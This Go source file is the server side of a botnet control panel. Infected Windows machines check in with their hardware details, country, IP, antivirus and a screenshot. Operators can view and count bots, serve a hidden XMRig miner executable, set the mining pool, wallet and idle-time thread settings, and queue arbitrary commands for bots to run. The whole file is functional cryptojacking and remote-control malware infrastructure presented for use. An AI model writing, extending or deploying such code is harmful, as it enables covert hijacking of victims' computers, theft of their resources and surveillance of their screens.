package main

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	"log"
	"strconv"
	"time"

	"github.com/kataras/iris/v12"
	"github.com/kataras/iris/v12/sessions"
	_ "github.com/mattn/go-sqlite3"
)

var (
	cookieNameForSessionID = RandStringBytesRmndr(128)
	sess                   = sessions.New(sessions.Config{Cookie: cookieNameForSessionID, Expires: 24 * time.Hour})
	db                     *sql.DB
)

func main() {

	fmt.Printf("Running")
	sqliteDatabase, _ := sql.Open("sqlite3", "./server.db?_journal_mode=WAL")
	db = sqliteDatabase
	app := iris.New()
	app.Use(sess.Handler())
	view := iris.HTML("./views", ".html")
	app.RegisterView(view)
	view.Delims("{ {", "} }")
	view.Reload(true)
	app.OnErrorCode(iris.StatusNotFound, notFoundHandler)
	app.HandleDir("/", "./assets")
	app.Post("/", devicePagePost)
	app.Get("/dash", dashboardPage)
	app.Get("/login", loginPage)
	app.Post("/login", loginPagePost)
	app.Get("/register", registerPage)
	app.Post("/register", registerPagePost)
	app.Get("/devices", devicePage)
	app.Get("/screenshot/{pcname:string}", imageRetrieve)
	app.Get("/mining", miningPage)
	app.Post("/mining", miningPagePost)
	app.Get("/xmrig", xmrigDownload)
	app.Get("/tasks", taskPage)
	app.Post("/tasks", taskPagePost)
	app.Get("/about", aboutPage)
	app.Listen("127.0.0.1:80")

}

func notFoundHandler(ctx iris.Context) {
	if err := ctx.View("404"); err != nil {
		ctx.HTML("<h3>%s</h3>", err.Error())
		return
	}
}

func xmrigDownload(ctx iris.Context) {
	ctx.SendFile("./assets/downloads/xmrig-hidden.exe", "xmrig.exe")

}

func imageRetrieve(ctx iris.Context) {
	pcname := ctx.Params().Get("pcname")
	if pcname == "" {
		ctx.StatusCode(iris.StatusBadRequest)
		ctx.WriteString("Invalid PC name")
		return
	}

	var imageData []byte
	query := "SELECT screenshot FROM bots WHERE pcname = ?"
	err := db.QueryRow(query, pcname).Scan(&imageData)
	if err != nil {
		if err == sql.ErrNoRows {
			ctx.StatusCode(iris.StatusNotFound)
			ctx.WriteString("No image found for the given PC name")
		} else {
			ctx.StatusCode(iris.StatusInternalServerError)
			ctx.WriteString("Failed to retrieve image")
		}
		return
	}

	ctx.ContentType("image/png")
	ctx.Write(imageData)
}

func dashboardPage(ctx iris.Context) {
	if auth, _ := sess.Start(ctx).GetBoolean("authenticated"); !auth {
		if err := ctx.View("404"); err != nil {
			ctx.HTML("<h3>%s</h3>", err.Error())
			return
		}
		return
	}

	ctx.ViewData("mapcounts", MakeMap())
	ctx.ViewData("table", TopInfected())
	if err := ctx.View("dashboard"); err != nil {
		ctx.HTML("<h3>%s</h3>", err.Error())
		return
	}
}

func loginPage(ctx iris.Context) {
	test, answer := generateMathProblem()
	session := sess.Start(ctx)
	session.Set("answer", answer)
	ctx.ViewData("loginCaptcha", test)
	if err := ctx.View("login"); err != nil {
		ctx.HTML("<h3>%s</h3>", err.Error())
		return
	}
}

func loginPagePost(ctx iris.Context) {
	session := sess.Start(ctx)
	username := ctx.FormValue("username")
	password := ctx.FormValue("password")
	captcha := ctx.FormValue("answer")
	if captcha != session.GetString("answer") {
		ctx.HTML(`<h3>Incorrect Captcha!</h3><br><a href="/login">Return to login</a>`)
		return
	}
	userinfo := []UserInfo{}
	userrow, err := db.Query("SELECT username,password FROM users WHERE username=? LIMIT 1", username)
	if err != nil {
		fmt.Println(err)
	}
	for userrow.Next() {
		var info UserInfo
		err := userrow.Scan(&info.Username, &info.Password)
		if err != nil {
			fmt.Println(err)
		}
		userinfo = append(userinfo, info)
	}
	if len(userinfo) == 0 {
		ctx.Redirect("/login")
		return
	} else {
		if CheckPasswordHash(password, userinfo[0].Password) {
			session := sess.Start(ctx)
			session.Set("authenticated", true)
			session.Set("username", userinfo[0].Username)
			ctx.Redirect("/dash")
		} else {
			ctx.HTML(`<h3>Incorrect Password!</h3><br><a href="/login">Return to login</a>`)
			return
		}
	}
}

func registerPage(ctx iris.Context) {
	if auth, _ := sess.Start(ctx).GetBoolean("authenticated"); auth {
		ctx.Redirect("/dash")
		return
	}
	userinfo := []UserInfo{}
	userrow, err := db.Query("SELECT username,password FROM users")
	if err != nil {
		log.Fatal(err)
	}
	for userrow.Next() {
		var task UserInfo
		err := userrow.Scan(&task.Username, &task.Password)
		if err != nil {
			log.Fatal(err)
		}
		userinfo = append(userinfo, task)
	}
	if len(userinfo) > 0 {
		if err := ctx.View("500"); err != nil {
			ctx.HTML("<h3>%s</h3>", err.Error())
			return
		}
		return
	}
	if err := ctx.View("register"); err != nil {
		ctx.HTML("<h3>%s</h3>", err.Error())
		return
	}
}

func registerPagePost(ctx iris.Context) {
	formusername := ctx.FormValue("username")
	formpassword := ctx.FormValue("password")
	userinfo := []UserInfo{}
	userrow, err := db.Query("SELECT username,password FROM users")
	if err != nil {
		log.Fatal(err)
	}
	for userrow.Next() {
		var task UserInfo
		err := userrow.Scan(&task.Username, &task.Password)
		if err != nil {
			log.Fatal(err)
		}
		userinfo = append(userinfo, task)
	}
	if len(userinfo) > 0 {
		ctx.Redirect("/login")
		return
	}
	password, err := HashPassword(formpassword)
	if err != nil {
		log.Println(err)
	}

	db.Exec("INSERT INTO users(username,password) VALUES(?,?)", formusername, password)
	ctx.Writef("Account Created! Username is: " + formusername + ", Password is: " + formpassword)
}

func devicePage(ctx iris.Context) {
	db.Exec(`UPDATE bots SET status="offline" WHERE lastcon < strftime('%s', 'now') - 360 AND lastcon > strftime('%s', 'now') - 259200`)
	db.Exec(`UPDATE bots SET status="dead" WHERE lastcon < strftime('%s', 'now') - 259200`)
	onlinebotsquery, err := db.Query(`SELECT LOWER(nation) AS nation, pcname, cpu, gpu, av, os, lastcon, status FROM bots WHERE status = 'online';`)
	if err != nil {
		if err := ctx.View("404"); err != nil {
			log.Fatal(err)
			ctx.HTML("<h3>%s</h3>", err.Error())
			return
		}
		log.Fatal(err)
	}
	defer func() {
		if err := onlinebotsquery.Close(); err != nil {
			if err := ctx.View("404"); err != nil {
				log.Fatal(err)
				ctx.HTML("<h3>%s</h3>", err.Error())
				return
			}
			log.Fatal(err)
		}
	}()
	var onlineinfosplice []WinSystemInfo
	for onlinebotsquery.Next() {
		var info WinSystemInfo
		err := onlinebotsquery.Scan(&info.Nation, &info.PCName, &info.CPU, &info.GPU, &info.Antivirus, &info.OS, &info.Lastcon, &info.Status)
		if err != nil {
			if err := ctx.View("404"); err != nil {
				log.Fatal(err)
				ctx.HTML("<h3>%s</h3>", err.Error())
				return
			}
			log.Fatal(err)
		}
		onlineinfosplice = append(onlineinfosplice, info)
	}

	offlinebotsquery, err := db.Query(`SELECT LOWER(nation) AS nation, pcname, cpu, gpu, av, os, lastcon, status FROM bots WHERE status IN ('offline', 'dead');`)
	if err != nil {
		if err := ctx.View("404"); err != nil {
			log.Fatal(err)
			ctx.HTML("<h3>%s</h3>", err.Error())
			return
		}
		log.Fatal(err)
	}
	defer func() {
		if err := offlinebotsquery.Close(); err != nil {
			if err := ctx.View("404"); err != nil {
				log.Fatal(err)
				ctx.HTML("<h3>%s</h3>", err.Error())
				return
			}
			log.Fatal(err)
		}
	}()
	var offlineinfosplice []WinSystemInfo
	for offlinebotsquery.Next() {
		var info WinSystemInfo
		err := offlinebotsquery.Scan(&info.Nation, &info.PCName, &info.CPU, &info.GPU, &info.Antivirus, &info.OS, &info.Lastcon, &info.Status)
		if err != nil {
			if err := ctx.View("404"); err != nil {
				log.Fatal(err)
				ctx.HTML("<h3>%s</h3>", err.Error())
				return
			}
			log.Fatal(err)
		}
		offlineinfosplice = append(offlineinfosplice, info)
	}
	ctx.ViewData("total", GetTotalBots()[0].Count)
	ctx.ViewData("online", GetOnlineBots()[0].Count)
	ctx.ViewData("offline", GetOfflineBots()[0].Count)
	ctx.ViewData("dead", GetDeadBots()[0].Count)
	ctx.ViewData("offlinebotinfo", offlineinfosplice)
	ctx.ViewData("onlinebotinfo", onlineinfosplice)
	if err := ctx.View("devices"); err != nil {
		ctx.HTML("<h3>%s</h3>", err.Error())
		return
	}
}

func aboutPage(ctx iris.Context) {
	if auth, _ := sess.Start(ctx).GetBoolean("authenticated"); !auth {
		if err := ctx.View("404"); err != nil {
			ctx.HTML("<h3>%s</h3>", err.Error())
			return
		}
		return
	}
	if err := ctx.View("about"); err != nil {
		ctx.HTML("<h3>%s</h3>", err.Error())
		return
	}

}

func miningPage(ctx iris.Context) {
	if auth, _ := sess.Start(ctx).GetBoolean("authenticated"); !auth {
		if err := ctx.View("404"); err != nil {
			ctx.HTML("<h3>%s</h3>", err.Error())
			return
		}
		return
	}
	ctx.ViewData("config", GetConfig())
	if err := ctx.View("mining"); err != nil {
		ctx.HTML("<h3>%s</h3>", err.Error())
		return
	}

}

func miningPagePost(ctx iris.Context) {
	if auth, _ := sess.Start(ctx).GetBoolean("authenticated"); !auth {
		if err := ctx.View("404"); err != nil {
			ctx.HTML("<h3>%s</h3>", err.Error())
			return
		}
		return
	}
	miningpool := ctx.FormValue("pool")
	miningaddress := ctx.FormValue("address")
	miningpassword := ctx.FormValue("password")
	miningthreads := ctx.FormValue("threads")
	idle_time := ctx.FormValue("idle_time")
	idle_threads := ctx.FormValue("idle_threads")

	threads, err := strconv.Atoi(miningthreads)
	if err != nil {
		ctx.StatusCode(iris.StatusBadRequest)
		ctx.WriteString("Invalid threads value")
		return
	}

	idleTime, err := strconv.Atoi(idle_time)
	if err != nil {
		ctx.StatusCode(iris.StatusBadRequest)
		ctx.WriteString("Invalid idle_time value")
		return
	}

	idleThreads, err := strconv.Atoi(idle_threads)
	if err != nil {
		ctx.StatusCode(iris.StatusBadRequest)
		ctx.WriteString("Invalid idle_threads value")
		return
	}

	var pool string
	query := `SELECT pool FROM minerconfig WHERE id = 1`
	err = db.QueryRow(query).Scan(&pool)

	if err == sql.ErrNoRows {

		insertQuery := `INSERT INTO minerconfig (id, pool, address, password, threads, idle_time, idle_threads) 
                    VALUES (1,?, ?, ?, ?, ?, ?)`
		_, err = db.Exec(insertQuery, miningpool, miningaddress, miningpassword, threads, idleTime, idleThreads)
		if err != nil {
			log.Fatalf("Error inserting data: %v", err)
		}
		ctx.Redirect("/mining")
	} else if err == nil {

		updateQuery := `UPDATE minerconfig 
                    SET pool = ?, address = ?, password = ?, threads = ?, idle_time = ?, idle_threads = ?
                    WHERE id = ?`
		_, err = db.Exec(updateQuery, miningpool, miningaddress, miningpassword, threads, idleTime, idleThreads, 1)
		if err != nil {
			log.Fatalf("Error updating data: %v", err)
		}
		ctx.Redirect("/mining")
	} else {

		log.Fatalf("Database query error: %v", err)
	}
	ctx.Redirect("/mining")

}

func taskPage(ctx iris.Context) {
	if auth, _ := sess.Start(ctx).GetBoolean("authenticated"); !auth {
		if err := ctx.View("404"); err != nil {
			ctx.HTML("<h3>%s</h3>", err.Error())
			return
		}
		return
	}
	ctx.ViewData("taskinfo", GetTasks())
	if err := ctx.View("tasks"); err != nil {
		ctx.HTML("<h3>%s</h3>", err.Error())
		return
	}

}

func taskPagePost(ctx iris.Context) {
	if auth, _ := sess.Start(ctx).GetBoolean("authenticated"); !auth {
		if err := ctx.View("404"); err != nil {
			ctx.HTML("<h3>%s</h3>", err.Error())
			return
		}
		return
	}
	executetype := ctx.FormValue("type")
	command := ctx.FormValue("command")
	parameter := ctx.FormValue("parameters")
	filter := ctx.FormValue("filter")
	executions := ctx.FormValue("executions")
	executionsnum, _ := strconv.Atoi(executions)
	_, err := db.Exec("INSERT INTO tasks (tid, command, parameter, filtermethod, filter, wanted_executions, current_executions, created, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", RandStringBytesRmndr(8), command, parameter, executetype, filter, executionsnum, 0, time.Now().Unix(), "active")
	if err != nil {
		fmt.Println(err)
		ctx.Redirect("/404")
		return
	}
	ctx.Redirect("/tasks")

}

func devicePagePost(ctx iris.Context) {

	var data WinSystemInfo
	if err := ctx.ReadJSON(&data); err != nil {
		ctx.StatusCode(iris.StatusBadRequest)
		ctx.WriteString(fmt.Sprintf("Invalid JSON: %v", err))
		return
	}
	if CheckData(data) {

		decodedScreenshot, err := base64.StdEncoding.DecodeString(data.Screenshot)
		if err != nil {
			ctx.StatusCode(iris.StatusInternalServerError)
			ctx.WriteString(fmt.Sprintf("Failed to decode screenshot: %v", err))
			return
		}

		updateQuery := `
		INSERT INTO bots (pcname, nation, ipaddr, cpu, gpu, av, os, firstcon, lastcon, status, screenshot)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(pcname) DO UPDATE SET
			nation = excluded.nation,
			ipaddr = excluded.ipaddr,
			cpu = excluded.cpu,
			gpu = excluded.gpu,
			av = excluded.av,
			os = excluded.os,
			lastcon = excluded.lastcon,
			status = excluded.status,
			screenshot = excluded.screenshot;`

		_, err = db.Exec(updateQuery, data.PCName, data.Nation, data.IP, data.CPU, data.GPU, data.Antivirus, data.OS,
			time.Now().Unix(), time.Now().Unix(), "online", decodedScreenshot)
		if err != nil {

			ctx.StatusCode(iris.StatusInternalServerError)
			ctx.WriteString(fmt.Sprintf("Failed to insert or update database: %v", err))
			return
		}

		rows, err := db.Query("SELECT id, pool, address, password, threads, idle_time, idle_threads FROM minerconfig;")
		if err != nil {
			ctx.StatusCode(iris.StatusInternalServerError)
			ctx.WriteString(fmt.Sprintf("Failed to query database: %v", err))
			return
		}
		defer rows.Close()

		var configs []map[string]interface{}
		for rows.Next() {
			var id, threads, idleTime, idleThreads int
			var pool, address, password string
			if err := rows.Scan(&id, &pool, &address, &password, &threads, &idleTime, &idleThreads); err != nil {
				ctx.StatusCode(iris.StatusInternalServerError)
				ctx.WriteString(fmt.Sprintf("Failed to scan row: %v", err))
				return
			}

			config := map[string]interface{}{
				"pool":         pool,
				"address":      address,
				"password":     password,
				"threads":      threads,
				"idle_time":    idleTime,
				"idle_threads": idleThreads,
				"task":         CheckTasks(data),
			}
			configs = append(configs, config)
		}

		if err := rows.Err(); err != nil {
			ctx.StatusCode(iris.StatusInternalServerError)
			ctx.WriteString(fmt.Sprintf("Error iterating rows: %v", err))
			return
		}

		ctx.JSON(configs)

	} else {

		ctx.Redirect("/404")
		return

	}

}
